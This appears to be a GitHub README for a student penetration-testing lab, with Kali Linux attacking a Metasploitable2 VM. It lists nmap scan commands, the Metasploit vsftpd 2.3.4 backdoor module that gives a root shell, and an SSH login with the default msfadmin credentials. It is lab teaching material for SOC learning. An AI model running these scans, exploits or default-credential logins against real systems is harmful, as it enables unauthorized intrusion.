# kali-metasploitable-lab
Penetration testing sim using Kali Linux and Metasploitable2

# Kali Linux & Metasploitable2: Penetration Testing Lab

This project simulates an internal network attack scenario using Kali Linux (attacker) and Metasploitable2 (target). It demonstrates core reconnaissance, exploitation, and post-exploitation techniques aligned with SOC Analyst learning objectives.

---

## Lab Setup

| Component      | Details                        |
|----------------|--------------------------------|
| Attacker       | Kali Linux (UTM VM)            |
| Target         | Metasploitable2 (UTM VM)       |
| Network        | Shared NAT / Bridged           |
| Connectivity   | Confirmed via ping             |

---

## Phase 1: Reconnaissance

### Target IP: `192.168.64.3`

#### Basic Nmap Scan
```bash
nmap -sS -T4 192.168.64.3 -oN basic-scan.txt
```
Summary of Open Ports:
- 21 (FTP)
- 22 (SSH)
- 80 (HTTP)
  
#### Service Version Detection
```bash
nmap -sS -sV -T4 192.168.64.3 -oN version-scan.txt
```
Summary:
- FTP: vsftpd 2.3.4
- SSH: OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
- HTTP: Apache 2.2.8
  
#### Vulnerability Detection
```bash
nmap --script vuln -T4 192.168.64.3 -oN vuln-scan.txt
```
Summary: 
- Port 21 (FTP) - VULNERABLE to vsftpd 2.3.4 backdoor (CVE-2011-2523)
- Port 80 (HTTP) - Apache version outdated with multiple CVEs


---

## Phase 2: Exploitation

### Exploit: vsftpd 2.3.4 Backdoor (CVE-2011-2523)

#### Tool Used: Metasploit Framework

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.64.3
exploit
```

Result: 
* Successful shell access as root
* Verified with ```whoami```

---
### SSH Exploit: 

**Target IP:** 192.168.64.3  
**Tool Used:** Native OpenSSH Client

**Login Attempt:**
```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.64.3
```

Result: 
* Successful login using default credentials:
  * Username: msfadmin
  * Password: msfadmin
* Access confirmed with:
  ```whoami```

####Compatibility Issue: Legacy SSH Key Algorithms

**Problem Encountered**
```Unable to negotiate with 192.168.64.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss```
**Solution**
```ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.64.3```

Lessons Learned:
Modern SSH clients disable insecure key types by default. In these lab scenarios with outdated systems compatibility flags may be required to access vulnerable targets. SOC teams should monitor for these depreciated cryptographic negotiations as potential attack indicators. 
